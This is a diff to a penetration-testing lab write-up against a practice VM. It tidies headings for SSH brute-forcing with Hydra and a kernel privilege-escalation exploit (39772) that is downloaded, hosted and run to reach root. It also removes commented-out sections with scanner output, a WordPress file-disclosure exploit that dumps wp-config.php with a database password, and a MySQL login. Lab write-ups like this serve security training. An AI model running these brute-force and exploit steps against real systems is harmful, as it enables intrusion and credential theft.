@@ -147,6 +147,8 @@ The SSH banner revealed another potential username, "barry".
 -----------------------------------------------------------------
 ```
 
+---
+
 ### Dirsearch
 
 Ran dirsearch to scan for hidden directories and files on the web server.
@@ -558,13 +560,13 @@ elly
 
 ### SSH Brute-forcing
 
-Brute-forced the SSH service using the extracted user list.
+Brute-forced the SSH service using Hydra and the extracted user list.
 
 ```
 hydra -L users.txt -P users.txt 10.101.85.17 ssh -F
 ```
 
-The attack successfully discovered the valid credentials SHayslett for the SSH service.
+The attack successfully discovered valid SSH credentials for the user SHayslett.
 
 ```
 ┌──(kali㉿kali)-[~/Desktop/ccmtlab/07]
@@ -589,7 +591,13 @@ ssh SHayslett@10.101.85.17
 SHayslett
 ```
 
-Enumerated the system to identify the OS version and checked current sudo privileges.
+---
+
+## Privilege Escalation
+
+### System Enumeration
+
+The system runs an outdated Ubuntu 16.04 kernel and the current user has no sudo privileges.
 
 ```
 SHayslett@red:~$ uname -a
@@ -658,6 +666,10 @@ Shellcodes: No Results
 
 ```
 
+---
+
+### Exploit 39772
+
 Mirrored the selected exploit script to the local working directory.
 
 ```
@@ -667,7 +679,7 @@ searchsploit -m linux/local/39772.txt
 Downloaded the precompiled exploit binaries from the Exploit-DB repository.
 
 ```
-https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
+wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
 ```
 
 Started a temporary HTTP server to host the exploit files for the target machine.
@@ -676,7 +688,7 @@ Started a temporary HTTP server to host the exploit files for the target machine
 python3 -m http.server 80
 ```
 
-Navigated to the temporary directory on the target system and downloaded the exploit package
+Navigated to the temporary directory on the target system and downloaded the exploit package.
 
 ```
 cd /tmp
@@ -730,539 +742,3 @@ we have root privs now...
 root@red:/tmp/39772/ebpf_mapfd_doubleput_exploit# id
 uid=0(root) gid=0(root) groups=0(root),1005(SHayslett)
 ```
-
-
-
-
-<!-- ---
-
-### Nmap 2
-
-Ran a targeted Nmap scan on ports above 1000 to look for hidden services.
-
-```
-nmap -Pn -A -p1000- 10.101.85.17
-```
-
-The scan discovered an open MySQL database on port 3306 and an alternative HTTP web server on port 12380. The web server title revealed another potential username, "tim".
-
-```
-┌──(kali㉿kali)-[~/Desktop/ccmtlab/07]
-└─$ nmap -Pn -A -p1000- 10.101.85.17
-Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-25 02:20 -0400
-Nmap scan report for 10.101.85.17
-Host is up (0.0039s latency).
-Not shown: 64534 filtered tcp ports (no-response)
-PORT      STATE SERVICE VERSION
-3306/tcp  open  mysql   MySQL 5.7.33-0ubuntu0.16.04.1
-| ssl-cert: Subject: commonName=MySQL_Server_5.7.33_Auto_Generated_Server_Certificate
-| Not valid before: 2024-10-16T12:39:02
-|_Not valid after:  2034-10-14T12:39:02
-| mysql-info: 
-|   Protocol: 10
-|   Version: 5.7.33-0ubuntu0.16.04.1
-|   Thread ID: 2480
-|   Capabilities flags: 65535
-|   Some Capabilities: SupportsTransactions, ConnectWithDatabase, LongPassword, IgnoreSigpipes, InteractiveClient, Speaks41ProtocolOld, Support41Auth, LongColumnFlag, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, SwitchToSSLAfterHandshake, FoundRows, ODBCClient, Speaks41ProtocolNew, SupportsCompression, IgnoreSpaceBeforeParenthesis, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
-|   Status: Autocommit
-|   Salt: 0U\x19k\[0/tCgy5Gnb.z?]
-|_  Auth Plugin Name: mysql_native_password
-|_ssl-date: TLS randomness does not represent time
-12380/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
-|_http-title: Tim, we need to-do better next year for Initech
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Aggressive OS guesses: Linux 3.11 - 4.9 (97%), Linux 3.13 (94%), Linux 3.10 - 3.16 (93%), Linux 3.10 - 4.11 (92%), Linux 3.13 - 4.4 (92%), Linux 3.16 - 4.6 (92%), Linux 3.8 - 3.16 (92%), Linux 4.0 - 4.4 (92%), Linux 4.4 (92%), Linux 3.2 - 4.14 (92%)
-No exact OS matches for host (test conditions non-ideal).
-Network Distance: 2 hops
-
-TRACEROUTE (using port 3306/tcp)
-HOP RTT     ADDRESS
-1   4.92 ms 10.101.55.1
-2   5.29 ms 10.101.85.17
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 136.01 seconds
-```
-
----
-
-### Nikto 2
-
-Scanned port 12380 using nikto to identify web vulnerabilities on plain HTTP.
-
-```
-nikto -h 10.101.85.17 -p 12380
-```
-
-The scan encountered unusual response headers and failed to fully enumerate the directories, suggesting that the web server enforces SSL/TLS.
-
-```
-┌──(kali㉿kali)-[~/Desktop/ccmtlab/07]
-└─$ nikto -h 10.101.85.17 -p 12380    
-- Nikto v2.6.0
----------------------------------------------------------------------------
-+ Target IP:          10.101.85.17
-+ Target Hostname:    10.101.85.17
-+ Target Port:        12380
-+ Platform:           Linux/Unix
-+ Start Time:         2026-05-25 02:48:16 (GMT-4)
----------------------------------------------------------------------------
-+ Server: Apache/2.4.18 (Ubuntu)
-+ ERROR: Failed to check for updates: 403
-+ [999100] /: Uncommon header(s) 'dave' found, with contents: Soemthing doesn't look right here.
-+ No CGI Directories found (use '-C all' to force check all possible dirs). CGI tests skipped.
-+ [600050] Apache/2.4.18 appears to be outdated (current is at least 2.4.66).
-```
-
-Rescanned port 12380 with the -ssl flag to force an encrypted connection.
-
-```
-nikto -h 10.101.85.17 -p 12380 -ssl
-```
-
-The SSL scan completed successfully, exposing an SSL certificate registered to "Red.Initech" along with a hidden /robots.txt file and an active /phpmyadmin/ directory.
-
-```
-┌──(kali㉿kali)-[~/Desktop/ccmtlab/07]
-└─$ nikto -h 10.101.85.17 -p 12380 -ssl
-- Nikto v2.6.0
----------------------------------------------------------------------------
-+ Target IP:          10.101.85.17
-+ Target Hostname:    10.101.85.17
-+ Target Port:        12380
----------------------------------------------------------------------------
-+ SSL Info:           Subject:  /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
-                      CN:       Red.Initech
-                      Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
-                      Issuer:   /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
-+ Platform:           Unknown
-+ Start Time:         2026-05-25 02:55:17 (GMT-4)
----------------------------------------------------------------------------
-+ Server: Apache/2.4.18 (Ubuntu)
-+ ERROR: Failed to check for updates: 403
-+ [999100] /: Uncommon header(s) 'dave' found, with contents: Soemthing doesn't look right here.
-+ No CGI Directories found (use '-C all' to force check all possible dirs). CGI tests skipped.
-+ [999996] /robots.txt: contains 2 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
-+ [600050] Apache/2.4.18 appears to be outdated (current is at least 2.4.66).
-+ [999993] /: Hostname '10.101.85.17' does not match certificate names (CN: Red.Initech, SAN: none). See: https://cwe.mitre.org/data/definitions/297.html
-+ [013587] /: Suggested security header missing: referrer-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy
-+ [013587] /: Suggested security header missing: strict-transport-security. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
-+ [013587] /: Suggested security header missing: content-security-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
-+ [013587] /: Suggested security header missing: x-content-type-options. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options
-+ [013587] /: Suggested security header missing: permissions-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy
-+ [999990] OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
-+ [999100] /phpmyadmin/changelog.php: Uncommon header(s) 'x-ob_mode' found, with contents: 1.
-+ [003584] /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
-+ /: No creds found for realm 'phpMyAdmin Setup'
-+ [007342] /: X-Frame-Options header is deprecated and was replaced with the Content-Security-Policy HTTP header with the frame-ancestors directive. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Frame-Options
-+ [007352] /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
-+ 8442 requests: 17 errors and 14 items reported on the remote host
-+ End Time:           2026-05-25 03:07:27 (GMT-4) (730 seconds)
----------------------------------------------------------------------------
-+ 1 host(s) tested
-```
-
-Accessed the robots.txt file on port 12380 to find disallowed web directories.
-
-```
-https://10.101.85.17:12380/robots.txt
-```
-
-The file contents revealed two restricted directories: /admin112233/ and /blogblog/.
-
-```
-User-agent: *
-Disallow: /admin112233/
-Disallow: /blogblog/
-```
-
-Investigated the restricted /admin112233/ directory to check for administrative panels.
-
-```
-https://10.101.85.17:12380/admin112233/
-```
-
-The directory redirected to an unrelated external website via a popup, yielding no useful administrative information.
-
-![](./images/02.png)
-
-Investigated the restricted /blogblog/ directory to identify the main web application.
-
-```
-https://10.101.85.17:12380/blogblog/
-```
-
-The directory successfully loaded the Initech home page, which is running on top of a WordPress platform.
-
-![](./images/03.png)
-
---- -->
-
-<!-- ### Wpscan
-
-Executed wpscan with aggressive plugin detection to enumerate vulnerable components on the target WordPress site.
-
-```
-wpscan --url https://10.101.85.17:12380/blogblog/ --no-update --disable-tls-checks --plugins-detection aggressive
-```
-
-The scan successfully identified an outdated WordPress core (v4.2.1) and detected the advanced-video-embed-embed-videos-or-playlists plugin.
-
-```
-┌──(kali㉿kali)-[~/Desktop/ccmtlab/07]
-└─$ wpscan --url https://10.101.85.17:12380/blogblog/ --no-update --disable-tls-checks --plugins-detection aggressive
-_______________________________________________________________
-         __          _______   _____
-         \ \        / /  __ \ / ____|
-          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
-           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
-            \  /\  /  | |     ____) | (__| (_| | | | |
-             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
-
-         WordPress Security Scanner by the WPScan Team
-                         Version 3.8.28
-       Sponsored by Automattic - https://automattic.com/
-       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
-_______________________________________________________________
-
-[+] URL: https://10.101.85.17:12380/blogblog/ [10.101.85.17]
-[+] Started: Mon May 25 22:16:21 2026
-
-Interesting Finding(s):
-
-[+] Headers
- | Interesting Entries:
- |  - Server: Apache/2.4.18 (Ubuntu)
- |  - Dave: Soemthing doesn't look right here
- | Found By: Headers (Passive Detection)
- | Confidence: 100%
-
-[+] XML-RPC seems to be enabled: https://10.101.85.17:12380/blogblog/xmlrpc.php
- | Found By: Headers (Passive Detection)
- | Confidence: 100%
- | Confirmed By:
- |  - Link Tag (Passive Detection), 30% confidence
- |  - Direct Access (Aggressive Detection), 100% confidence
- | References:
- |  - http://codex.wordpress.org/XML-RPC_Pingback_API
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
- |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
-
-[+] WordPress readme found: https://10.101.85.17:12380/blogblog/readme.html
- | Found By: Direct Access (Aggressive Detection)
- | Confidence: 100%
-
-[+] Registration is enabled: https://10.101.85.17:12380/blogblog/wp-login.php?action=register
- | Found By: Direct Access (Aggressive Detection)
- | Confidence: 100%
-
-[+] Upload directory has listing enabled: https://10.101.85.17:12380/blogblog/wp-content/uploads/
- | Found By: Direct Access (Aggressive Detection)
- | Confidence: 100%
-
-[+] The external WP-Cron seems to be enabled: https://10.101.85.17:12380/blogblog/wp-cron.php
- | Found By: Direct Access (Aggressive Detection)
- | Confidence: 60%
- | References:
- |  - https://www.iplocation.net/defend-wordpress-from-ddos
- |  - https://github.com/wpscanteam/wpscan/issues/1299
-
-[+] WordPress version 4.2.1 identified (Insecure, released on 2015-04-27).
- | Found By: Rss Generator (Passive Detection)
- |  - https://10.101.85.17:12380/blogblog/?feed=rss2, <generator>http://wordpress.org/?v=4.2.1</generator>
- |  - https://10.101.85.17:12380/blogblog/?feed=comments-rss2, <generator>http://wordpress.org/?v=4.2.1</generator>
-
-[+] WordPress theme in use: bhost
- | Location: https://10.101.85.17:12380/blogblog/wp-content/themes/bhost/
- | Last Updated: 2026-02-26T00:00:00.000Z
- | Readme: https://10.101.85.17:12380/blogblog/wp-content/themes/bhost/readme.txt
- | [!] The version is out of date, the latest version is 2.3
- | Style URL: https://10.101.85.17:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1
- | Style Name: BHost
- | Description: Bhost is a nice , clean , beautifull, Responsive and modern design free WordPress Theme. This theme ...
- | Author: Masum Billah
- | Author URI: http://getmasum.net/
- |
- | Found By: Css Style In Homepage (Passive Detection)
- |
- | Version: 1.2.9 (80% confidence)
- | Found By: Style (Passive Detection)
- |  - https://10.101.85.17:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1, Match: 'Version: 1.2.9'
-
-[+] Enumerating All Plugins (via Aggressive Methods)
- Checking Known Locations - Time: 00:02:29 <==============================> (119897 / 119897) 100.00% Time: 00:02:29
-[+] Checking Plugin Versions (via Passive and Aggressive Methods)
-
-[i] Plugin(s) Identified:
-
-[+] advanced-video-embed-embed-videos-or-playlists
- | Location: https://10.101.85.17:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/
- | Latest Version: 1.0 (up to date)
- | Last Updated: 2015-10-14T13:52:00.000Z
- | Readme: https://10.101.85.17:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt
- | [!] Directory listing is enabled
- |
- | Found By: Known Locations (Aggressive Detection)
- |  - https://10.101.85.17:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/, status: 200
- |
- | Version: 1.0 (80% confidence)
- | Found By: Readme - Stable Tag (Aggressive Detection)
- |  - https://10.101.85.17:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt
-
-[+] akismet
- | Location: https://10.101.85.17:12380/blogblog/wp-content/plugins/akismet/
- | Latest Version: 5.7
- | Last Updated: 2026-04-23T22:34:00.000Z
- |
- | Found By: Known Locations (Aggressive Detection)
- |  - https://10.101.85.17:12380/blogblog/wp-content/plugins/akismet/, status: 403
- |
- | The version could not be determined.
-
-[+] shortcode-ui
- | Location: https://10.101.85.17:12380/blogblog/wp-content/plugins/shortcode-ui/
- | Last Updated: 2019-01-16T22:56:00.000Z
- | Readme: https://10.101.85.17:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt
- | [!] The version is out of date, the latest version is 0.7.4
- | [!] Directory listing is enabled
- |
- | Found By: Known Locations (Aggressive Detection)
- |  - https://10.101.85.17:12380/blogblog/wp-content/plugins/shortcode-ui/, status: 200
- |
- | Version: 0.6.2 (100% confidence)
- | Found By: Readme - Stable Tag (Aggressive Detection)
- |  - https://10.101.85.17:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt
- | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
- |  - https://10.101.85.17:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt
-
-[+] two-factor
- | Location: https://10.101.85.17:12380/blogblog/wp-content/plugins/two-factor/
- | Latest Version: 0.16.0
- | Last Updated: 2026-03-27T17:24:00.000Z
- | Readme: https://10.101.85.17:12380/blogblog/wp-content/plugins/two-factor/readme.txt
- | [!] Directory listing is enabled
- |
- | Found By: Known Locations (Aggressive Detection)
- |  - https://10.101.85.17:12380/blogblog/wp-content/plugins/two-factor/, status: 200
- |
- | The version could not be determined.
-
-[+] Enumerating Config Backups (via Passive and Aggressive Methods)
- Checking Config Backups - Time: 00:00:00 <=====================================> (137 / 137) 100.00% Time: 00:00:00
-
-[i] No Config Backups Found.
-
-[!] No WPScan API Token given, as a result vulnerability data has not been output.
-[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
-
-[+] Finished: Mon May 25 22:19:02 2026
-[+] Requests Done: 120087
-[+] Cached Requests: 13
-[+] Data Sent: 35.356 MB
-[+] Data Received: 16.238 MB
-[+] Memory used: 521.395 MB
-[+] Elapsed time: 00:02:40
-```
-
-Discovered a known Arbitrary File Disclosure exploit (EDB-ID: 39646) targeting the identified plugin on GitHub.
-
-```
-https://github.com/gtech/39646/blob/master/39646.py
-```
-
-Downloaded the exploit script onto the attack machine using wget.
-
-```
-wget https://raw.githubusercontent.com/gtech/39646/refs/heads/master/39646.py
-```
-
-Modified the target URL configuration within the exploit script to match the target environment.
-
-```
-url = "https://10.101.85.17:12380/blogblog"
-```
-
-Executed the exploit using Python, piping the output through sed to correctly format the newline characters.
-
-```
-python 39646.py | sed "s/\\\n/\n/g"
-```
-
-The exploit successfully extracted the internal WordPress configuration file (wp-config.php), exposing the plaintext root database credentials.
-
-```
-┌──(kali㉿kali)-[~/Desktop/ccmtlab/07]
-└─$ python 39646.py | sed "s/\\\n/\n/g"
-/home/kali/Desktop/ccmtlab/07/39646.py:65: SyntaxWarning: invalid escape sequence '\.'
-  linkstring = re.findall(str(int(id)) + '".*?\.jpeg', content)[0]
-b'<?php
-/**
- * The base configurations of the WordPress.
- *
- * This file has the following configurations: MySQL settings, Table Prefix,
- * Secret Keys, and ABSPATH. You can find more information by visiting
- * {@link https://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
- * Codex page. You can get the MySQL settings from your web host.
- *
- * This file is used by the wp-config.php creation script during the
- * installation. You don\'t have to use the web site, you can just copy this file
- * to "wp-config.php" and fill in the values.
- *
- * @package WordPress
- */
-
-// ** MySQL settings - You can get this info from your web host ** //
-/** The name of the database for WordPress */
-define(\'DB_NAME\', \'wordpress\');
-
-/** MySQL database username */
-define(\'DB_USER\', \'root\');
-
-/** MySQL database password */
-define(\'DB_PASSWORD\', \'plbkac\');
-
-/** MySQL hostname */
-define(\'DB_HOST\', \'localhost\');
-
-/** Database Charset to use in creating database tables. */
-define(\'DB_CHARSET\', \'utf8mb4\');
-
-/** The Database Collate type. Don\'t change this if in doubt. */
-define(\'DB_COLLATE\', \'\');
-
-/**#@+
- * Authentication Unique Keys and Salts.
- *
- * Change these to different unique phrases!
- * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
- * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
- *
- * @since 2.6.0
- */
-define(\'AUTH_KEY\',         \'V 5p=[.Vds8~SX;>t)++Tt57U6{Xe`T|oW^eQ!mHr }]>9RX07W<sZ,I~`6Y5-T:\');
-define(\'SECURE_AUTH_KEY\',  \'vJZq=p.Ug,]:<-P#A|k-+:;JzV8*pZ|K/U*J][Nyvs+}&!/#>4#K7eFP5-av`n)2\');
-define(\'LOGGED_IN_KEY\',    \'ql-Vfg[?v6{ZR*+O)|Hf OpPWYfKX0Jmpl8zU<cr.wm?|jqZH:YMv;zu@tM7P:4o\');
-define(\'NONCE_KEY\',        \'j|V8J.~n}R2,mlU%?C8o2[~6Vo1{Gt+4mykbYH;HDAIj9TE?QQI!VW]]D`3i73xO\');
-define(\'AUTH_SALT\',        \'I{gDlDs`Z@.+/AdyzYw4%+<WsO-LDBHT}>}!||Xrf@1E6jJNV={p1?yMKYec*OI$\');
-define(\'SECURE_AUTH_SALT\', \'.HJmx^zb];5P}hM-uJ%^+9=0SBQEh[[*>#z+p>nVi10`XOUq (Zml~op3SG4OG_D\');
-define(\'LOGGED_IN_SALT\',   \'[Zz!)%R7/w37+:9L#.=hL:cyeMM2kTx&_nP4{D}n=y=FQt%zJw>c[a+;ppCzIkt;\');
-define(\'NONCE_SALT\',       \'tb(}BfgB7l!rhDVm{eK6^MSN-|o]S]]axl4TE_y+Fi5I-RxN/9xeTsK]#ga_9:hJ\');
-
-/**#@-*/
-
-/**
- * WordPress Database Table prefix.
- *
- * You can have multiple installations in one database if you give each a unique
- * prefix. Only numbers, letters, and underscores please!
- */
-$table_prefix  = \'wp_\';
-
-/**
- * For developers: WordPress debugging mode.
- *
- * Change this to true to enable the display of notices during development.
- * It is strongly recommended that plugin and theme developers use WP_DEBUG
- * in their development environments.
- */
-define(\'WP_DEBUG\', false);
-
-/* That\'s all, stop editing! Happy blogging. */
-
-/** Absolute path to the WordPress directory. */
-if ( !defined(\'ABSPATH\') )
-\tdefine(\'ABSPATH\', dirname(__FILE__) . \'/\');
-
-/** Sets up WordPress vars and included files. */
-require_once(ABSPATH . \'wp-settings.php\');
-
-define(\'WP_HTTP_BLOCK_EXTERNAL\', true);
-'
-```
-
-เข้า mysql
-
-```
-mysql -h 10.101.85.17 -u root -p'plbkac' --skip-ssl
-``` -->
-
-<!-- Executed wpscan with user enumeration enabled to harvest valid WordPress accounts.
-
-```
-wpscan --url https://10.101.85.17:12380/blogblog/ --disable-tls-checks --no-update -e u
-```
-
-text
-
-```                                                                                                                   
-┌──(kali㉿kali)-[~/Desktop/ccmtlab/07]
-└─$ wpscan --url https://10.101.85.17:12380/blogblog/ --disable-tls-checks --no-update -e u
-...[snip]...
-
-[i] User(s) Identified:
-
-[+] 
- | Found By: Author Posts - Display Name (Passive Detection)
-
-[+] kathy
- | Found By: Author Posts - Display Name (Passive Detection)
- | Confirmed By:
- |  Rss Generator (Passive Detection)
- |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
- |  Login Error Messages (Aggressive Detection)
-
-[+] John Smith
- | Found By: Author Posts - Display Name (Passive Detection)
- | Confirmed By: Rss Generator (Passive Detection)
-
-[+] heather
- | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
- | Confirmed By: Login Error Messages (Aggressive Detection)
-
-[+] john
- | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
- | Confirmed By: Login Error Messages (Aggressive Detection)
-
-[+] elly
- | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
- | Confirmed By: Login Error Messages (Aggressive Detection)
-
-[+] peter
- | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
- | Confirmed By: Login Error Messages (Aggressive Detection)
-
-[+] barry
- | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
- | Confirmed By: Login Error Messages (Aggressive Detection)
-
-[+] garry
- | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
- | Confirmed By: Login Error Messages (Aggressive Detection)
-
-[+] harry
- | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
- | Confirmed By: Login Error Messages (Aggressive Detection)
-
-[+] scott
- | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
- | Confirmed By: Login Error Messages (Aggressive Detection)
-
-[+] tim
- | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
- | Confirmed By: Login Error Messages (Aggressive Detection)
-
-[!] No WPScan API Token given, as a result vulnerability data has not been output.
-[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
-
-[+] Finished: Mon May 25 04:35:05 2026
-[+] Requests Done: 73
-[+] Cached Requests: 6
-[+] Data Sent: 20.645 KB
-[+] Data Received: 323.377 KB
-[+] Memory used: 199.871 MB
-[+] Elapsed time: 00:00:04
-
-``` -->
